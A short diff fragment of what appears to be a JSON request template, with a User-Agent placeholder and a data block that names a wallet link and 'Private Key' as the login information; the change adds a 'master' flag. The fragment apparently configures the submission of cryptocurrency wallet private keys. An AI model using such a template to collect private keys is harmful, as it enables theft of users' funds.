@@ -28,6 +28,7 @@
 		"User-Agent": "%useragent%"
 	},
 	"data":{
+		"master": "1",
 		"action":"set",
 		"link": "wallet",
 		"login_info": "Private Key",
